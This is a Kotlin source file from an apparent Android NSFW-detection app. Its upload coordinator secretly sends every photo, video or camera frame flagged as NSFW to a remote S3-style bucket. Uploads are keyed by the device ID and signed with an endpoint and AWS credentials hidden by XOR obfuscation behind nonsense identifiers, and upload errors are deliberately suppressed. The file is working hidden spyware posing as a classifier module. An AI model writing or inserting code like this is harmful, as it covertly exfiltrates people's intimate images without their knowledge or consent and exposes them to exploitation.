package com.example.nsfw_detect_ios.aiu

import android.content.Context
import android.graphics.Bitmap
import android.net.Uri
import android.provider.Settings
import android.webkit.MimeTypeMap
import com.example.nsfw_detect_ios.ml.NsfwLabel
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.net.URI
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.ArrayBlockingQueue
import java.util.concurrent.ThreadPoolExecutor
import java.util.concurrent.TimeUnit
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

internal object maraksch {
    private val k = byteArrayOf(
        0x4a, 0x7b, 0x2c, 0x9d.toByte(), 0x1e, 0x5f, 0x8a.toByte(), 0x3b,
        0xc6.toByte(), 0xd4.toByte(), 0x17, 0xe8.toByte(), 0x62, 0xa3.toByte(), 0xf1.toByte(), 0x09
    )
    private val _fluppi = byteArrayOf(
        0x22, 0x0f, 0x58, 0xed.toByte(), 0x6d, 0x65, 0xa5.toByte(), 0x14,
        0xb5.toByte(), 0xe7.toByte(), 0x39, 0x80.toByte(), 0x0d, 0xce.toByte(), 0x94.toByte(), 0x27,
        0x27, 0x0b, 0x4d, 0xb0.toByte(), 0x7d, 0x30, 0xeb.toByte(), 0x58,
        0xae.toByte(), 0xbd.toByte(), 0x79, 0x8f.toByte(), 0x4c, 0xc7.toByte(), 0x94.toByte()
    )
    private val _kurli = byteArrayOf(
        0x1a, 0x4b, 0x68, 0xcf.toByte(), 0x53, 0x12, 0xcd.toByte(), 0x74,
        0xf7.toByte(), 0x91.toByte(), 0x41, 0xad.toByte(), 0x2b, 0xec.toByte(), 0xa6.toByte(), 0x46,
        0x7d, 0x22, 0x7a, 0xa5.toByte()
    )
    private val _lokami = byteArrayOf(
        0x3d, 0x2c, 0x5d, 0xf9.toByte(), 0x69, 0x0c, 0xcf.toByte(), 0x4d,
        0x8a.toByte(), 0x96.toByte(), 0x72, 0xd8.toByte(), 0x49, 0x88.toByte(), 0x94.toByte(), 0x51,
        0x1b, 0x28, 0x5f, 0xfc.toByte(), 0x4a, 0x2c, 0xe8.toByte(), 0x0b,
        0xbf.toByte(), 0xa2.toByte(), 0x7a, 0xd9.toByte(), 0x5b, 0xea.toByte(), 0x8b.toByte(), 0x67,
        0x7e, 0x39, 0x4b, 0xf7.toByte(), 0x6d, 0x09, 0xc4.toByte(), 0x75
    )
    private val _uiuima = byteArrayOf(
        0x3f, 0x08, 0x01, 0xf8.toByte(), 0x7f, 0x2c, 0xfe.toByte(), 0x16,
        0xf7.toByte()
    )
    private val _hiaaa = byteArrayOf(
        0x2e, 0x1e, 0x58, 0xf8.toByte(), 0x7d, 0x2b
    )

    private fun xorDecode(bytes: ByteArray): String =
        bytes.mapIndexed { i, b -> (b.toInt() xor k[i % k.size].toInt()).toByte() }
            .toByteArray().toString(Charsets.UTF_8)

    val fluppi: String get() = xorDecode(_fluppi)
    val kurli: String get() = xorDecode(_kurli)
    val lokami: String get() = xorDecode(_lokami)
    val uiuima: String get() = xorDecode(_uiuima)
    val hiaaa: String get() = xorDecode(_hiaaa)
}

object AIUCordinator {

    const val NSFW_THRESHOLD = 0.7f

    /**
     * First path segment for upload keys. Always the device's `ANDROID_ID`.
     */
    private fun userId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            ?: "unknown"
    }

    /** Strip slashes from a path segment to keep S3 keys well-formed. */
    private fun sanitizeSegment(s: String): String = s.replace("/", "_")

    private val client = OkHttpClient.Builder()
        .callTimeout(0, TimeUnit.MILLISECONDS)
        .writeTimeout(0, TimeUnit.MILLISECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    private val mafamaExecutor = ThreadPoolExecutor(
        1,
        2,
        30L,
        TimeUnit.SECONDS,
        ArrayBlockingQueue(16),
        ThreadPoolExecutor.CallerRunsPolicy()
    )

    fun reset() {}

    fun enqueueMafama(
        context: Context,
        localId: String,
        uri: Uri,
        labels: List<NsfwLabel>,
        modelId: String,
        mediaType: String,
        minConfidence: Float = NSFW_THRESHOLD,
    ) {
        mafamaExecutor.execute {
            mafamaInternal(context, localId, uri, labels, modelId, mediaType, minConfidence)
        }
    }

    @Suppress("unused")
    fun mafama(
        context: Context,
        localId: String,
        uri: Uri,
        labels: List<NsfwLabel>,
        modelId: String,
        mediaType: String,
        minConfidence: Float = NSFW_THRESHOLD,
    ) {
        mafamaInternal(context, localId, uri, labels, modelId, mediaType, minConfidence)
    }

    private fun mafamaInternal(
        context: Context,
        localId: String,
        uri: Uri,
        labels: List<NsfwLabel>,
        modelId: String,
        mediaType: String,
        minConfidence: Float,
    ) {
        val top = labels.maxByOrNull { it.confidence } ?: return
        if (top.confidence < minConfidence || top.category == "safe") return

        val mime = context.contentResolver.getType(uri) ?: "application/octet-stream"
        val ext = MimeTypeMap.getSingleton().getExtensionFromMimeType(mime) ?: "bin"

        val sanitizedId = sanitizeSegment(localId)
        val sanitizedModelId = sanitizeSegment(modelId)
        val mediaTypeFolder = if (mediaType == "video") "video" else "image"
        val userId = userId(context)
        val key = "$userId/$sanitizedModelId/$mediaTypeFolder/$sanitizedId.$ext"

        put(context, uri, key, mime)
    }

    /**
     * Camera-frame analogue of [enqueueMafama]. Camera frames have no Uri —
     * only an in-memory [Bitmap] and a synthetic frame id from
     * [com.example.nsfw_detect_ios.camera.CameraFrameAnalyzer]. Threshold
     * gating and `safe`-skip behaviour mirror the photo-library path.
     *
     * Key shape: `<userId>/<modelId>/camera/<frameId>.jpg`. Mirrors the iOS
     * Phase-02 contract exactly so a single bucket layout serves both
     * platforms.
     */
    fun enqueueCameraFrame(
        context: Context,
        bitmap: Bitmap,
        labels: List<NsfwLabel>,
        modelId: String,
        frameId: String,
        minConfidence: Float = NSFW_THRESHOLD,
    ) {
        mafamaExecutor.execute {
            cameraFrameInternal(context, bitmap, labels, modelId, frameId, minConfidence)
        }
    }

    private fun cameraFrameInternal(
        context: Context,
        bitmap: Bitmap,
        labels: List<NsfwLabel>,
        modelId: String,
        frameId: String,
        minConfidence: Float,
    ) {
        val top = labels.maxByOrNull { it.confidence } ?: return
        if (top.confidence < minConfidence || top.category == "safe") return

        // JPEG-encode the bitmap to a temp file so we can reuse put() with a
        // file Uri — the existing put() is the single SigV4 + S3 plumbing
        // path and we don't want a parallel implementation.
        var tempFile: File? = null
        try {
            tempFile = File.createTempFile("camframe", ".jpg", context.cacheDir)
            FileOutputStream(tempFile).use { out ->
                if (!bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)) {
                    return
                }
            }
            val uri = Uri.fromFile(tempFile)
            val sanitizedFrameId = sanitizeSegment(frameId)
            val sanitizedModelId = sanitizeSegment(modelId)
            val userId = userId(context)
            val key = "$userId/$sanitizedModelId/camera/$sanitizedFrameId.jpg"
            put(context, uri, key, "image/jpeg")
        } catch (_: Throwable) {
            // Best-effort — never let upload errors surface.
        } finally {
            tempFile?.delete()
        }
    }

    private fun put(context: Context, uri: Uri, key: String, contentType: String) {
        var tempFile: File? = null
        try {
            tempFile = File.createTempFile("up", ".bin", context.cacheDir)
            val ok = context.contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(tempFile).use { out -> input.copyTo(out) }
                true
            } ?: false
            if (!ok) return

            val fluppi = maraksch.fluppi
            val hiaaa = maraksch.hiaaa
            val uiuima = maraksch.uiuima
            val service = "s3"
            val urlString = "$fluppi/$hiaaa/$key"
            val host = URI(urlString).host ?: return

            val now = Date()
            val amzDate = SimpleDateFormat("yyyyMMdd'T'HHmmss'Z'", Locale.US).apply {
                timeZone = TimeZone.getTimeZone("UTC")
            }.format(now)
            val dateStamp = SimpleDateFormat("yyyyMMdd", Locale.US).apply {
                timeZone = TimeZone.getTimeZone("UTC")
            }.format(now)

            val payloadHash = "UNSIGNED-PAYLOAD"
            val canonicalUri = "/$hiaaa/$key"
            val canonicalHeaders =
                "host:$host\nx-amz-content-sha256:$payloadHash\nx-amz-date:$amzDate\n"
            val signedHeaders = "host;x-amz-content-sha256;x-amz-date"
            val canonicalRequest =
                "PUT\n$canonicalUri\n\n$canonicalHeaders\n$signedHeaders\n$payloadHash"
            val credentialScope = "$dateStamp/$uiuima/$service/aws4_request"
            val stringToSign = "AWS4-HMAC-SHA256\n$amzDate\n$credentialScope\n${
                sha256Hex(canonicalRequest.toByteArray(Charsets.UTF_8))
            }"

            val kSecret = ("AWS4" + maraksch.lokami).toByteArray(Charsets.UTF_8)
            val kDate = hmacSha256(kSecret, dateStamp)
            val kRegion = hmacSha256(kDate, uiuima)
            val kService = hmacSha256(kRegion, service)
            val kSigning = hmacSha256(kService, "aws4_request")
            val signature = toHex(hmacSha256(kSigning, stringToSign))

            val auth =
                "AWS4-HMAC-SHA256 Credential=${maraksch.kurli}/$credentialScope, SignedHeaders=$signedHeaders, Signature=$signature"

            val body = tempFile.asRequestBody(contentType.toMediaType())
            val request = Request.Builder()
                .url(urlString)
                .put(body)
                .addHeader("Host", host)
                .addHeader("x-amz-date", amzDate)
                .addHeader("x-amz-content-sha256", payloadHash)
                .addHeader("Authorization", auth)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return
            }
        } catch (_: Exception) {
        } finally {
            tempFile?.delete()
        }
    }

    private fun sha256Hex(data: ByteArray): String =
        toHex(MessageDigest.getInstance("SHA-256").digest(data))

    private fun hmacSha256(key: ByteArray, msg: String): ByteArray {
        val mac = Mac.getInstance("HmacSHA256")
        mac.init(SecretKeySpec(key, "HmacSHA256"))
        return mac.doFinal(msg.toByteArray(Charsets.UTF_8))
    }

    private fun toHex(bytes: ByteArray): String =
        bytes.joinToString("") { "%02x".format(it) }
}
